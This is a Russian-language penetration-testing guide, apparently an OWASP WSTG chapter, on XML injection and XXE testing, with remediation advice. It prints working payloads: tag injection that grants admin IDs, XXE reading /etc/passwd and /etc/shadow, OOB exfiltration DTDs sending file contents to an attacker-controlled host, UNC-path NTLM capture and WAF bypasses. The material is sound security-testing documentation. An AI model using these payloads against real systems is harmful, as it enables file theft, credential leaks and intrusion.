    XML-инъекция (XML Injection)¶

    ID
    WSTG-INJT-07

    Резюме¶

    Тестирование на внедрение XML-кода (XML Injection testing) заключается в попытке внедрить или модифицировать XML-документ, обрабатываемый приложением. Если XML-парсер не выполняет контекстную валидацию данных или небезопасно сконфигурирован, тест завершится положительным результатом.

    В этом разделе приводятся практические примеры внедрения XML. Сначала описывается коммуникационный API на базе XML и объясняются принципы его работы. Затем демонстрируется метод обнаружения, основанный на попытке внедрения метасимволов XML. После выполнения первого шага тестировщик получает информацию о структуре XML, что позволяет внедрять данные и теги XML (внедрение тегов [Tag Injection]) либо эксплуатировать конфигурацию парсера для доступа к локальным и удаленным ресурсам (внедрение внешних сущностей XML [XML External Entity / XXE Injection]).

    Цели тестирования¶

    • Идентифицировать точки внедрения XML-кода.
    • Оценить типы эксплойтов, которые могут быть реализованы, и степень их критичности.

    Методика тестирования¶

    Предположим, существует современное веб-приложение или веб-служба (такая как SOAP или RESTful API), принимающая XML-данные при регистрации пользователей.

    Когда пользователь регистрируется, заполняя форму HTML или взаимодействуя с клиентским приложением, данные пользователя отправляются в POST-запросе, содержащем XML-нагрузку:

    POST /api/addUser HTTP/1.1
Host: www.example.com
Content-Type: application/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>

    Бэкенд-приложение разбирает эту XML-нагрузку и вставляет полученные значения в базу данных или внутреннее состояние системы (часто дополняя ее сгенерированными сервером полями, такими как userid). Если приложение динамически формирует XML-ответы или пересылает эти XML-данные в другую бэкенд-систему путем конкатенации строк без надлежащей санитизации, оно становится уязвимым к структурной XML-инъекции. С другой стороны, если сам XML-парсер небезопасно сконфигурирован, приложение становится уязвимым к атакам на основе сущностей (XXE).

    Обнаружение¶

    Первым шагом тестирования приложения на наличие уязвимости XML Injection является попытка внедрения метасимволов XML.

    Метасимволами XML являются:

    • Одинарные и двойные кавычки (' и "): если они не санитизируются, эти символы могут вызвать исключение при разборе XML или позволить атакующему преждевременно закрыть атрибут. Это происходит, когда внедренная кавычка совпадает с символом, используемым для обрамления значения атрибута.

    Например, предположим, что приложение использует одинарные кавычки для атрибутов:

    <node attrib='$inputValue'/>

    Если передать полезную нагрузку $inputValue = foo', результирующий XML примет вид:

    <node attrib='foo''/>

    Полученный XML-документ оказывается синтаксически некорректным и невалидным. Точно такая же логика применима к двойным кавычкам ("), если значение атрибута заключено в двойные кавычки (например, <node attrib="$inputValue"/>).

    • Угловые скобки: > и < — при добавлении открывающей или закрывающей угловой скобки в пользовательский ввод:

    Username = foo<

    приложение сформирует новый узел:

    <user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

    однако из-за присутствия незакрытого знака < результирующий XML-документ становится невалидным.

    • Тег комментария: <!-- и --> — эта последовательность символов интерпретируется как начало или конец комментария. Таким образом, внедрение одного из них в параметр Username:

    Username = foo<!--

    приведет к формированию узла следующего вида:

    <user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

    что не является валидной последовательностью XML.

    • Амперсанд: & — амперсанд используется в синтаксисе XML для обозначения сущностей. Формат сущности имеет вид &symbol;. Сущность отображается на символ в кодировке Unicode.

    Например:

    <tagnode>&lt;</tagnode>

    является синтаксически корректным и валидным и обозначает символ < таблицы ASCII.

    Если символ & не кодируется как &amp;, его можно использовать для проверки на XML-инъекцию.

    Действительно, при передаче входных данных вида:

    Username = &foo

    будет создан новый узел:

    <user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</user>

    однако документ снова окажется невалидным: &foo не оканчивается символом ;, а сущность &foo; не определена.

    • Разделители секций CDATA: <![CDATA[ и ]]> — секции CDATA используются для экранирования блоков текста, содержащих символы, которые иначе были бы распознаны как элементы разметки. Иными словами, символы, заключенные в секцию CDATA, не обрабатываются XML-парсером.

    Например, если внутри текстового узла необходимо представить строку <foo>, можно использовать секцию CDATA:

    <node>
    <![CDATA[<foo>]]>
</node>

    благодаря чему <foo> не будет разбираться как разметка и будет воспринят как символьные данные.

    Если узел формируется следующим образом:

    <username><![CDATA[<$userName]]></username>

    тестировщик может попытаться внедрить закрывающую последовательность CDATA ]]>, чтобы нарушить структуру XML-документа:

    userName = ]]>

    что приведет к конструкции:

    <username><![CDATA[]]>]]></username>

    которая не является валидным фрагментом XML.

    Другой тест связан с тегом CDATA. Предположим, что XML-документ обрабатывается для генерации HTML-страницы. В этом случае разделители секций CDATA могут быть просто удалены без дальнейшего анализа их содержимого. Тогда появляется возможность внедрить HTML-теги, которые будут включены в сгенерированную страницу в обход существующих процедур санитизации.

    Рассмотрим конкретный пример. Предположим, у нас есть узел, содержащий текст, отображаемый пользователю:

    <html>
    $HTMLCode
</html>

    Тогда атакующий может передать следующий ввод:

    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>

    и получить узел вида:

    <html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>

    В процессе обработки разделители секций CDATA удаляются, генерируя следующий HTML-код:

    <script>
    alert('XSS')
</script>

    В результате приложение оказывается уязвимым к межсайтовому скриптингу (XSS).

    Внедрение тегов (Tag Injection)¶

    После выполнения первого шага и сопоставления структуры XML тестировщик может попытаться внедрить полные XML-теги. Это может привести к обходу бизнес-логики или повышению привилегий, если приложение использует разобранный XML для принятия решений об авторизации.

    Рассмотрим сценарий, в котором пользовательский ввод напрямую конкатенируется в бэкенд-запрос XML. Приложение динамически формирует следующий XML-узел для взаимодействия со внутренней службой:

    <user>
    <username>$username</username>
    <password>$password</password>
    <userid>500</userid>
    <email>$email</email>
</user>

    Манипулируя полем ввода $email, тестировщик может внедрить закрывающий тег для текущего элемента и открыть новый. Если внедряемое значение имеет вид:

    s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com

    бэкенд сформирует следующий XML:

    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <email>s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com</email>
</user>

    Результирующий XML-документ является синтаксически корректным (well-formed). Более того, вполне вероятно, что XML-парсер обработает дублирующиеся теги <userid> последовательно и перезапишет начальное значение (500) последним переданным значением (0, часто обозначающим идентификатор администратора). В этом случае тестировщик успешно внедряет пользователя с правами администратора.

    Единственная сложность заключается в том, что теги userid и email встречаются дважды. Часто документы XML валидируются по схеме или определению типа документа (Document Type Definition, DTD) и отклоняются, если не соответствуют строгим правилам кратности (cardinality rules).

    Предположим, что бэкенд-документ XML строго описан DTD, требующим наличия ровно одного тега userid и одного тега email на пользователя:

    <!DOCTYPE user [
    <!ELEMENT user (username,password,userid,email) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT email (#PCDATA) >
]>

    В этом случае простая атака с внедрением тегов, показанная выше, не пройдет валидацию еще до начала обработки данных.

    Однако эту защиту можно обойти, если тестировщик контролирует значения нескольких узлов. Внедрив последовательность начала комментария XML (<!--) в одно поле, а последовательность конца комментария (-->) — в другое, тестировщик может скрыть исходные, сгенерированные сервером узлы.

    Например, тестировщик передает следующие значения для полей ввода:

    • Username: tony
    • Password: Un6R34kb!e</password><!--
    • Email: --><userid>0</userid><email>s4tan@hell.com

    Бэкенд-приложение объединяет их в структуру XML:

    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password><!--</password>
    <userid>500</userid>
    <email>--><userid>0</userid><email>s4tan@hell.com</email>
</user>

    Исходный узел <userid>500</userid> и дублирующиеся теги успешно закомментированы, и в документе остается только внедренный узел <userid>0</userid>. Теперь документ полностью соответствует строгим правилам DTD, и повышение привилегий проходит успешно.

    Внедрение внешних XML-сущностей (XXE)¶

    Набор допустимых сущностей XML может быть расширен путем объявления новых сущностей. Если определением сущности является URI, такая сущность называется внешней (external entity). Если парсер не настроен иначе, внешние сущности заставляют его обращаться к ресурсу, указанному в URI — например, к файлу на локальной машине или на удаленной системе. Такое поведение подвергает приложение атакам внедрения внешних сущностей XML (XML External Entity, XXE), которые могут использоваться для вызова отказа в обслуживании (Denial of Service), несанкционированного доступа к файлам, сканирования внутренних сетей и подделки запросов на стороне сервера (Server-Side Request Forgery, SSRF).

    Для проверки базовых уязвимостей XXE в XML-нагрузку можно внедрить объявление DOCTYPE с внешней сущностью:

    <?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE user [ 
    <!ELEMENT user ANY >
    <!ENTITY xxe SYSTEM "file:///dev/random" >
]>
<user>
    <username>&xxe;</username>
    <password>Un6R34kb!e</password>
    <email>s4tan@hell.com</email>
</user>

    Примечание: Имя DOCTYPE (user) совпадает с фактическим корневым элементом документа, а объявление ELEMENT ссылается на этот же корневой элемент — несовпадающее или оставшееся от другого примера имя DOCTYPE/ELEMENT (распространенная ошибка копирования при адаптации пейлоадов XXE под новый эндпоинт) все еще допускается большинством невалидирующих парсеров, однако их согласованность предотвращает сбои при обработке парсерами, выполняющими валидацию DTD.

    Этот тест может вызвать отказ в обслуживании в Unix-системах, если XML-парсер попытается разрешить сущность путем чтения из /dev/random, что способно заблокировать процесс на неопределенный срок (или потребовать значительных ресурсов) при попытке подстановки значения сущности.

    Другие полезные полезные нагрузки для тестирования раскрытия локальных файлов включают:

    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY xxe SYSTEM "file:///etc/shadow" >
<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini" >
<!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >

    Слепая атака XXE¶

    Во многих практических сценариях приложение не возвращает значение внешней сущности в HTTP-ответе, поэтому приведенный выше классический пример с чтением /etc/passwd неприменим напрямую. Такая уязвимость называется Blind XXE (слепой XXE). Уязвимость по-прежнему присутствует и доступна для эксплуатации, однако обнаружение и эксфильтрация данных требуют применения внеполосных техник (out-of-band, OOB) или, если исходящий трафик заблокирован, техник на основе сообщений об ошибках (error-based).

    Внеполосное (OOB) обнаружение с помощью параметрических сущностей¶

    Некоторые парсеры или правила WAF блокируют классические общие сущности (&xxe;), но не накладывают ограничений на сущности параметров (parameter entities), на которые можно ссылаться только внутри DTD и которые объявляются с символом % вместо &. Тестировщик может использовать сущность параметра, чтобы заставить целевой сервер выполнить исходящий DNS- или HTTP-запрос к контролируемому атакующим листенеру (например, Burp Collaborator, interact.sh или простому слушателю netcat/HTTP), подтверждая наличие уязвимости инъекции даже при полном отсутствии отраженных данных:

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/collect">
  %xxe;
]>
<foo>test</foo>

    Последующий DNS-запрос или обращение по HTTP к листенеру подтверждает, что XML-парсер разрешает внешние сущности, то есть приложение уязвимо даже при полностью слепом отклике.

    Внеполосная эксфильтрация данных через вредоносный внешний DTD¶

    После подтверждения внеполосного взаимодействия тестировщик может перейти от обнаружения к фактической эксфильтрации файлов, разместив вредоносный внешний DTD на контролируемом сервере и объединив сущности параметров в цепочку для извлечения содержимого файла в последующем запросе.

    Вредоносный DTD, размещенный по адресу http://<tester-controlled-host>/evil.dtd:

    <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<tester-controlled-host>/?data=%file;'>">
%eval;
%exfil;

    Полезная нагрузка, отправляемая в целевое приложение:

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/evil.dtd">
  %xxe;
]>
<foo>test</foo>

    Когда целевая система разбирает этот документ, она загружает evil.dtd, считывает локальный файл в сущность %file;, а затем выполняет второй исходящий запрос, встраивая содержимое файла в качестве параметра строки запроса, который тестировщик перехватывает на своем листенере. Поскольку URL-адреса не могут безопасно передавать произвольные бинарные данные или символы перевода строк, эта техника обычно ограничена однострочным, безопасным для URL текстом; для бинарных файлов или файлов, содержащих ломающие URL символы, тестировщики обычно комбинируют этот метод с языковыми обертками (например, php://filter/convert.base64-encode/resource= в PHP) для кодирования содержимого файла в Base64 перед эксфильтрацией, если целевой стек это поддерживает.

    Эксфильтрация на основе ошибок через удаленный внешний DTD¶

    Этот вариант по-прежнему требует от целевого сервера выполнения одного исходящего соединения (для загрузки DTD тестировщика), но, в отличие от вышеописанной техники OOB, не требует отправки второго запроса с данными на сервер атакующего — содержимое файла передается обратно через собственное сообщение об ошибке приложения вместо сетевого обратного вызова (callback). Это полезно в случаях, когда исходящие соединения разрешены, но тело ответа второго запроса эксфильтрации не сможет дойти до тестировщика.

    DTD, размещенный по адресу http://<tester-controlled-host>/error.dtd:

    <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

    Полезная нагрузка:

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<tester-controlled-host>/error.dtd">
  %xxe;
]>
<foo>test</foo>

    Парсер загружает DTD, пытается разрешить несуществующий путь, сформированный из содержимого целевого файла, завершается ошибкой и — в зависимости от парсера и степени подробности обработки ошибок в приложении — генерирует исключение, сообщение которого раскрывает запрошенный путь (содержащий внутри себя содержимое файла). Если приложение возвращает «сырые» ошибки парсера в своем ответе, это позволяет прочитать содержимое файла напрямую.

    Эксфильтрация на основе ошибок через переиспользование локального DTD (без исходящих соединений)¶

    Приведенная выше техника все еще требует одного исходящего соединения. Если в целевой среде исходящий трафик полностью заблокирован сетевой фильтрацией (полная фильтрация egress), этот вариант также не сработает — а чисто внутренний DOCTYPE обычно не может переопределять сущность параметра внутри определения другой сущности параметра (спецификация XML разрешает это только во внешних DTD, и большинство парсеров строго соблюдают это правило).

    Надежным решением является обращение к DTD-файлу, уже существующему в локальной файловой системе целевого сервера, в качестве «внешнего» DTD (загружаемого через file:// вместо http://), с последующим переопределением одной из сущностей, уже объявленных в этом DTD. Поскольку повторно используемый DTD технически остается «внешним» с точки зрения парсера (хотя сетевой доступ при этом не выполняется), трюк с переопределением сущности параметра снова становится допустимым, и аналогичную утечку на основе ошибок можно вызвать при полном отсутствии исходящей сетевой связности.

    Для этого необходимо знать путь к файлу DTD, реально присутствующему на сервере. Типичными кандидатами для проверки являются библиотеки обработки XML, поставляемые с сервером приложений (DTD приложений/сервлетов внутри JAR-файлов), и DTD операционной системы, такие как DTD документации GNOME/Yelp во многих дистрибутивах Linux (/usr/share/yelp/dtd/docbookx.dtd). Тестировщик может перебирать кандидатов, отправляя пейлоад, который только загружает DTD (без переопределения чего-либо) — если файл не существует, парсер сгенерирует ошибку отсутствия файла (file-not-found), что позволяет поочередно проверять словарь известных путей к DTD.

    Пример при условии, что на целевой системе существует файл /usr/local/app/schema.dtd, объявляющий сущность custom_entity:

    <!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>

    Обратите внимание, что переопределенное значение custom_entity записывается с использованием числовых ссылок на символы (&#x25; для %, &#x26; для &, &#x27; для '), а не литеральных знаков. Это обязательное требование, а не вопрос стиля: подставляемый текст сам разбирается как разметка DTD после подстановки, поэтому буквальные символы % или & внутри него раскрылись бы немедленно, не сохранившись до момента фактического переопределения — числовые ссылки откладывают это раскрытие до нужного этапа.

    Это загружает локальный DTD, переопределяет его сущность custom_entity полезной нагрузкой эксфильтрации на основе ошибок, а затем вызывает %local_dtd;, заставляя парсер обработать переопределенную сущность — вызывая ту же утечку содержимого файла в сообщении об ошибке, что и выше, но без единого байта сетевого трафика за пределы сервера. Такие инструменты, как проект dtd-finder, содержат списки известных путей к файлам DTD (и могут сканировать файловую систему или образ контейнера на наличие реально существующих DTD) для ускорения поиска.

    Атаки с использованием XInclude¶

    Иногда тестировщик контролирует только одно значение, которое позже встраивается в более крупный XML-документ, сформированный сервером (например, поле формы, попадающее во внутренний запрос SOAP). В этом случае тестировщик не может управлять объявлением <!DOCTYPE> или внедрить его, что исключает классические атаки на основе сущностей. XInclude представляет собой отдельную часть спецификации XML, позволяющую одному XML-документу включать контент из другого источника, и может быть вызван непосредственно из обычного значения данных — без необходимости объявления DOCTYPE:

    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

    Если бэкенд вставляет это значение в свой XML-документ без экранирования и в его парсере включена обработка XInclude, содержимое указанного файла будет встроено в эту позицию результирующего документа.

    XXE через загрузку файлов¶

    Многие приложения принимают файлы форматов, основанных на XML или содержащих встроенные XML-компоненты, даже если интерфейс загрузки позиционирует их просто как «документы» или «изображения». Они часто упускаются из виду как точки внедрения, поскольку тестировщик не взаимодействует с явным XML API.

    SVG¶

    SVG — это графический формат на базе XML. Если приложение разрешает загрузку SVG (или принимает произвольные форматы изображений и обрабатывает SVG), специально сформированный файл SVG может содержать DOCTYPE с внешней сущностью, разрешаемой при рендеринге или обработке, и в зависимости от логики обработки полученное значение может быть даже визуально отрисовано внутри сгенерированного изображения:

    <?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

    Документы Office Open XML (DOCX / XLSX / PPTX)¶

    Современные форматы офисных документов представляют собой ZIP-архивы, содержащие множество XML-файлов. Тестировщик может распаковать легитимный файл примера, внедрить DOCTYPE/сущность в один из внутренних XML-компонентов, запаковать его обратно в ZIP и загрузить в любой функционал, выполняющий серверный парсинг или конвертацию документа (генерация превью, извлечение текста, смена формата и т. д.).

    Пример: редактирование word/document.xml внутри файла .docx:

    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>

    Аналогичный подход применим к xl/workbook.xml в файлах .xlsx и к соответствующим частям файлов .pptx. Это полезная проверка для любого эндпоинта, принимающего офисные документы для индексации, создания миниатюр или конвертации: такие конвейеры часто строятся на устаревших или слабо сконфигурированных библиотеках XML, даже если основной уровень API приложения был защищен.

    Другие форматы на базе XML¶

    Тестировщикам также следует обращать внимание на менее очевидные XML-форматы, которые приложение может принимать на вход, включая XLIFF (файлы обмена локализацией), фиды RSS/Atom, конверты SOAP и любые пользовательские форматы импорта, документированные как «XML» или «на базе XML». Любой из них может нести те же полезные нагрузки DOCTYPE/сущностей или XInclude, показанные выше.

    Повышение критичности: SSRF и перехват учетных данных¶

    XXE не ограничивается чтением локальных файлов — тот же механизм внешних сущностей является примитивом подделки запросов, поэтому тестировщикам следует оценивать воздействие шире, чем просто чтение /etc/passwd:

    • SSRF к службам метаданных облачных провайдеров. В облачных окружениях обращение сущности к эндпоинту метаданных инстанса (например, http://169.254.169.254/... в AWS) может привести к раскрытию временных учетных данных — однако обратите внимание, что текущий стандарт AWS по умолчанию, IMDSv2, требует отправки запроса PUT со специальным заголовком для получения токена сессии перед выполнением любого GET, а XXE-инъекция (через идентификатор SYSTEM) обычно может выполнять только простой GET. На практике это означает, что классический перехват учетных данных метаданных через XXE сейчас работает в основном против устаревших или явно некорректно сконфигурированных инстансов, где по-прежнему включен IMDSv1 (HttpTokens не переведен в required) — проверяйте параметры метаданных инстанса, а не предполагайте уязвимость эндпоинта по умолчанию. Аналогичные эндпоинты метаданных в Azure и GCP также требуют специфических заголовков (Metadata: true / Metadata-Flavor: Google), которые простая сущность SYSTEM "http://..." установить не может по той же причине. Даже там, где прямое хищение учетных данных заблокировано, доступ к эндпоинту метаданных полезен для подтверждения SSRF и определения облачной платформы целевого сервера.
    • Сканирование внутренних сетей и портов. Разница во времени ответа или сообщениях об ошибках между доступными и недоступными внутренними узлами/портами может использоваться для составления карты внутренней топологии сети через уязвимый сервер.
    • Перехват учетных данных через UNC-пути (Windows). В парсерах, работающих под управлением Windows, направление сущности на UNC-путь (file://///attacker-ip/share/x) может заставить сервер инициировать аутентификацию по протоколу SMB к листенеру тестировщика, что приводит к утечке NTLM-хэша учетной записи службы для последующего офлайн-взлома.

    Эти последствия должны учитываться при оценке степени критичности уязвимости в соответствии с Целями тестирования — слепой XXE только с чтением файлов и XXE, приводящий к компрометации облачных учетных данных, имеют принципиально разную степень опасности, несмотря на идентичность точки внедрения.

    Техники обхода фильтров и WAF¶

    Если прямые пейлоады с <!DOCTYPE блокируются или вырезаются, перед тем как сделать вывод об отсутствии уязвимости, стоит проверить следующие вариации:

    • Кодирование полезной нагрузки: некоторые парсеры принимают альтернативные кодировки ввода (например, UTF-7), которые не содержат буквенных байтовых последовательностей, отслеживаемых фильтром, но тем не менее декодируются и разбираются как XML базовой библиотекой до применения логики фильтрации. Перекодирование пейлоада целиком позволяет обойти простые сигнатурные фильтры, ищущие открытый текст <!DOCTYPE или <!ENTITY.
    • Data URI (data:): если обработка протоколов парсером это допускает, base64-кодированный пейлоад можно передать через сущность параметра data:text/plain;base64,..., скрывая открытое содержимое DTD из текста запроса.
    • Альтернативные протокольные обертки вместо file://: в стеках на базе PHP обертки вроде php://filter/convert.base64-encode/resource= позволяют как обойти простые строковые фильтры на file://, так и решить отдельную проблему эксфильтрации бинарного или многострочного контента (см. примечание к OOB-эксфильтрации выше). В Java-стеках протокол jar: может использоваться для обращения к файлам внутри архивов ZIP/JAR, в том числе загружаемых с удаленного URL, что полезно, когда прямой доступ по file:// заблокирован, а доступ через архивы разрешен.
    • Разделение доверия между двумя кодировками: небольшое число парсеров декодирует числовые ссылки на символы HTML внутри значения сущности перед повторным разбором ее как фрагмента DTD; в таких случаях запись заблокированных ключевых слов в виде числовых символьных ссылок может проскользнуть мимо фильтра, распознающего только явную строку.

    Как и всегда при обходе фильтрации, проверяйте, действительно ли базовый парсер/версия демонстрирует требуемое поведение, а не предполагайте его универсальность — это направления для проверки, а не гарантированные способы обхода.

    Примечание о настройках современных парсеров по умолчанию¶

    Многие современные библиотеки и фреймворки синтаксического анализа XML сейчас поставляются с отключенным по умолчанию разрешением внешних сущностей либо предоставляют документированный флаг безопасной обработки (secure processing), использование которого тестировщикам необходимо проверять (это не означает, что тестирование на XXE можно пропустить — см. XML External Entity (XXE) Prevention Cheat Sheet). На практике эксплуатируемые уязвимости XXE сегодня чаще всего обнаруживаются в следующих случаях:

    • Парсер был безопасно настроен для основного API приложения, однако вторичный путь выполнения кода (обработка загружаемых файлов, конвертация документов, формирование отчетов, устаревший SOAP-эндпоинт) использует другой, незащищенный экземпляр парсера.
    • DTD отключены, однако обработка XInclude осталась включенной (обычно это раздельные конфигурационные флаги).
    • Сторонняя библиотека или зависимость содержит собственный XML-парсер с небезопасными настройками по умолчанию.
    • До сих пор используются устаревшие или самописные парсеры (встроенные устройства, легаси-стеки Java/C).

    Тестировщикам следует проверять каждый путь кода, обрабатывающий XML, изолированно, а не предполагать, что защита одного эндпоинта API гарантирует безопасность всего приложения.

    Тестирование методом «белого ящика»¶

    При аудите исходного кода проверяйте, безопасно ли настроены XML-парсеры для отключения DOCTYPE, внешних DTD и внешних сущностей параметров.

    Исчерпывающие примеры безопасной конфигурации для всех языков программирования приведены в OWASP XML External Entity (XXE) Prevention Cheat Sheet.

    Java¶

    Следующие Java API могут быть уязвимы к XXE при некорректной конфигурации:

    • javax.xml.parsers.DocumentBuilder / DocumentBuilderFactory
    • javax.xml.parsers.SAXParser / SAXParserFactory
    • javax.xml.stream.XMLInputFactory
    • javax.xml.transform.TransformerFactory / SAXTransformerFactory
    • org.xml.sax.XMLReader / EntityResolver
    • org.dom4j.io.SAXReader
    • org.jdom2.input.SAXBuilder
    • Xerces: DOMParser, SAXParser, XMLParser

    Примечание: Сторонние библиотеки, обрабатывающие форматы на основе XML (такие как Apache POI для документов OOXML), также могут вносить уязвимости XXE и XEE. При анализе кода обращайте внимание на характерные ключевые слова известных уязвимостей, такие как XSSFExportToXml или небезопасные конфигурации OPC SAX. Всегда проверяйте версию используемой библиотеки по официальным базам уязвимостей (например, Apache POI CVE Details), а не полагайтесь на безопасность по умолчанию.

    C / C++¶

    Следующие ключевые слова исходного кода могут указывать на уязвимые реализации:

    • libxml2: xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
    • libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

    Python¶

    Необходимо исследовать следующие пакеты и функции:

    • xml.etree.ElementTree и xml.dom.minidom: хотя они не раскрывают внешние сущности по умолчанию в современных версиях CPython, они все еще могут быть подвержены отказу в обслуживанию (DoS) через рекурсивное раскрытие сущностей (entity expansion) и другим пограничным проблемам.
    • lxml: проверьте, создается ли парсер явно с параметрами resolve_entities=True (и no_network=False), которые активируют XXE.
    • Рекомендация: defusedxml является стандартным безопасным аналогом стандартных XML-модулей Python для комплексного устранения рисков XXE и DoS.

    Node.js / JavaScript¶

    Обращайте внимание на устаревшие или слабо сконфигурированные библиотеки:

    • libxmljs: подстановка внешних сущностей выключена по умолчанию; ищите явное указание опции { noent: true }, которая включает ее обратно.
    • xml2js: эта библиотека «под капотом» опирается на чисто JavaScript-парсеры, такие как sax-js. Хотя она не разрешает внешние сущности по умолчанию, она может быть уязвима к DoS-атакам. Проверьте, не установлена ли опция strict явно в false.
    • xml2json: этот модуль использует node-expat (привязки C/C++ к парсеру Expat). Хотя Expat «из коробки» обычно защищен от классического чтения файлов через XXE, он может быть подвержен атакам XML Entity Expansion (DoS) при отсутствии явных ограничений.
    • xmldom: проверьте наличие любых явных конфигураций разрешения сущностей, поскольку поведение по умолчанию и возможности этой библиотеки исторически менялись от версии к версии.

    Рекомендации по устранению¶

    Наиболее надежным решением проблем класса XXE является полное лишение парсера возможности разрешать внешние ресурсы, а не попытки фильтрации или санитизации входного XML. Общие принципы в порядке приоритета:

    • Полностью отключите обработку DTD везде, где у приложения нет обоснованной бизнес-необходимости в ее использовании. Подавляющее большинство XML в приложениях (полезные нагрузки API, загрузка конфигов, данные форм, конвертируемые в XML) никогда не нуждается в объявлении DOCTYPE.
    • Если DTD невозможно отключить полностью, отключите разрешение внешних общих и параметрических сущностей и отключите обработку XInclude — обычно это раздельные флаги, поэтому выключение одного из них не гарантирует отключения другого.
    • Отдавайте предпочтение API и конфигурационным флагам парсеров с маркировкой «безопасная обработка» (secure processing) там, где они доступны, однако проверяйте, что именно они фактически отключают в используемой библиотеке и ее версии.
    • Примените эту конфигурацию к каждому создаваемому экземпляру парсера в кодовой базе и ее зависимостях, а не только к основному уровню API — обработка загрузки файлов, конвертация документов/генерация миниатюр, задачи импорта/экспорта, клиенты SOAP и сторонние библиотеки создают собственные экземпляры парсеров и требуют независимой проверки.
    • Если использование внешних сущностей является обязательным требованием, реализуйте строгий белый список (allow-list) разрешенных URI/схем вместо ненадежного черного списка (block-list/deny-list) для опасных протоколов (file://, ftp:// и т. д.).
    • Применяйте эшелонированную защиту: запускайте процессы разбора XML с минимальными привилегиями (без доступа к конфиденциальным файлам и без исходящего сетевого доступа там, где он не нужен) и своевременно обновляйте библиотеки XML, поскольку настройки по умолчанию и известные обходы меняются между версиями.

    Краткая памятка по экосистемам (сверяйтесь с актуальной документацией для конкретной используемой библиотеки и версии, поскольку значения по умолчанию менялись со временем):

    • Java: настройте DocumentBuilderFactory/SAXParserFactory/XMLInputFactory/TransformerFactory (и парсеры на базе Xerces) на отключение объявлений DOCTYPE, внешних общих/параметрических сущностей и XInclude.
    • .NET: используйте XmlReaderSettings со свойством DtdProcessing, установленным в Prohibit, и XmlResolver, установленным в null (или настройте ограничивающий пользовательский распознаватель).
    • Python: отдавайте предпочтение защищенным библиотекам парсинга (например, defusedxml) вместо прямого вызова стандартных модулей XML; для lxml явно оставляйте resolve_entities в безопасном значении по умолчанию (или установите False) и избегайте включения сетевого доступа в парсере.
    • PHP: в PHP 8.0+ функция libxml_disable_entity_loader() устарела и в большинстве случаев не требуется — PHP теперь требует libxml >= 2.9.0, в которой подстановка внешних сущностей отключена по умолчанию. Поэтому стандартный парсинг через DOMDocument/SimpleXML/libxml в актуальных версиях PHP не уязвим через классические сущности, если только код явно не активирует их (например, через LIBXML_NOENT в сочетании с LIBXML_DTDLOAD). Таким образом, тестировщикам на современном PHP следует проверять наличие явных флагов обратного включения; на PHP < 8.0 с устаревшими версиями libxml вызов отключения по-прежнему обязателен. В любом случае изолированно проверяйте функционал загрузки файлов и конвертации документов, использующий сторонние библиотеки, так как они могут содержать собственный парсер.
    • Node.js: при разборе через libxmljs никогда не устанавливайте опцию noent: true для ненадежного ввода; лучше опустить эту опцию (или задать false) и использовать в паре с nonet: true, чтобы также заблокировать сетевое разрешение сущностей.
    • C/C++ (libxml2): избегайте опций, включающих загрузку сетевых ресурсов и сущностей (например, XML_PARSE_NOENT, XML_PARSE_DTDLOAD), если они явно не требуются.

